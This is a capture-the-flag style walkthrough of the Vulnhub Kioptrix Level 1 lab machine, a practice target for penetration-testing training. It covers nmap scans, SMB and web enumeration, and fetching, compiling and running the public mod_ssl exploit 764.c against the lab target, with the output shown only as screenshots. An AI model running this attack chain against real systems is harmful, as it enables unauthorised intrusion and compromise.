# Kioptrix-Level-1

Author: Kioptrix
Web page: http://www.kioptrix.com/blog/?page_id=135

Download link: https://download.vulnhub.com/kioptrix/Kioptrix_Level_1.rar

## Vulnhub machine writeup

1. Find target IP 

    command : **nmap -sn 192.168.122.0/24**

![Kioptrix%20Level%201%2092fc1ded06c541e2aee03c560aa7f674/Untitled.png](Kioptrix%20Level%201%2092fc1ded06c541e2aee03c560aa7f674/Untitled.png)

### Scanning

  2.  nmap Full port scanning 

 command : **nmap -p- IP_address** 

![Kioptrix%20Level%201%2092fc1ded06c541e2aee03c560aa7f674/Untitled%201.png](Kioptrix%20Level%201%2092fc1ded06c541e2aee03c560aa7f674/Untitled%201.png)

 3.  Open ports —> 22, 80, 111, 139, 443, 1024

 4.  nmap -sV -A --script vuln -p [all_ports] Ip_address

![Kioptrix%20Level%201%2092fc1ded06c541e2aee03c560aa7f674/Untitled%202.png](Kioptrix%20Level%201%2092fc1ded06c541e2aee03c560aa7f674/Untitled%202.png)

### Enumeration

PORT - 139

 5. enum4linux IP_address 

![Kioptrix%20Level%201%2092fc1ded06c541e2aee03c560aa7f674/Untitled%203.png](Kioptrix%20Level%201%2092fc1ded06c541e2aee03c560aa7f674/Untitled%203.png)

6.  Enumerating smb file shares

**smbclient -L Ip_address**

![Kioptrix%20Level%201%2092fc1ded06c541e2aee03c560aa7f674/Untitled%204.png](Kioptrix%20Level%201%2092fc1ded06c541e2aee03c560aa7f674/Untitled%204.png)

7. Share IPC or ADMIN 

**smbclient [//IP_address/IPC$](//ip_address/IPC$) -U**

![Kioptrix%20Level%201%2092fc1ded06c541e2aee03c560aa7f674/Untitled%205.png](Kioptrix%20Level%201%2092fc1ded06c541e2aee03c560aa7f674/Untitled%205.png)

![Kioptrix%20Level%201%2092fc1ded06c541e2aee03c560aa7f674/Untitled%206.png](Kioptrix%20Level%201%2092fc1ded06c541e2aee03c560aa7f674/Untitled%206.png)

8. **searchsploit samba | grep remote**

![Kioptrix%20Level%201%2092fc1ded06c541e2aee03c560aa7f674/Untitled%207.png](Kioptrix%20Level%201%2092fc1ded06c541e2aee03c560aa7f674/Untitled%207.png)

![Kioptrix%20Level%201%2092fc1ded06c541e2aee03c560aa7f674/Untitled%208.png](Kioptrix%20Level%201%2092fc1ded06c541e2aee03c560aa7f674/Untitled%208.png)

![Kioptrix%20Level%201%2092fc1ded06c541e2aee03c560aa7f674/Untitled%209.png](Kioptrix%20Level%201%2092fc1ded06c541e2aee03c560aa7f674/Untitled%209.png)

![Kioptrix%20Level%201%2092fc1ded06c541e2aee03c560aa7f674/Untitled%2010.png](Kioptrix%20Level%201%2092fc1ded06c541e2aee03c560aa7f674/Untitled%2010.png)

![Kioptrix%20Level%201%2092fc1ded06c541e2aee03c560aa7f674/Untitled%2011.png](Kioptrix%20Level%201%2092fc1ded06c541e2aee03c560aa7f674/Untitled%2011.png)

 PORT 80

Scanning website using nikto 

**nikto -h IP_address**

![Kioptrix%20Level%201%2092fc1ded06c541e2aee03c560aa7f674/Untitled%2012.png](Kioptrix%20Level%201%2092fc1ded06c541e2aee03c560aa7f674/Untitled%2012.png)

### Exploitation

Apache mod_ssl 2.8.4 is vulnerable

![Kioptrix%20Level%201%2092fc1ded06c541e2aee03c560aa7f674/Untitled%2013.png](Kioptrix%20Level%201%2092fc1ded06c541e2aee03c560aa7f674/Untitled%2013.png)

**searchsploit mod_ssl**

![Kioptrix%20Level%201%2092fc1ded06c541e2aee03c560aa7f674/Untitled%2014.png](Kioptrix%20Level%201%2092fc1ded06c541e2aee03c560aa7f674/Untitled%2014.png)

**searchsploit -x exploit/unix/remote/764.c > 764.c**

![Kioptrix%20Level%201%2092fc1ded06c541e2aee03c560aa7f674/Untitled%2015.png](Kioptrix%20Level%201%2092fc1ded06c541e2aee03c560aa7f674/Untitled%2015.png)

**gcc 764.c -o 764**

**./764**

![Kioptrix%20Level%201%2092fc1ded06c541e2aee03c560aa7f674/Untitled%2016.png](Kioptrix%20Level%201%2092fc1ded06c541e2aee03c560aa7f674/Untitled%2016.png)

**./764 target host -c 42**

![Kioptrix%20Level%201%2092fc1ded06c541e2aee03c560aa7f674/Untitled%2017.png](Kioptrix%20Level%201%2092fc1ded06c541e2aee03c560aa7f674/Untitled%2017.png)

![Kioptrix%20Level%201%2092fc1ded06c541e2aee03c560aa7f674/Untitled%2018.png](Kioptrix%20Level%201%2092fc1ded06c541e2aee03c560aa7f674/Untitled%2018.png)
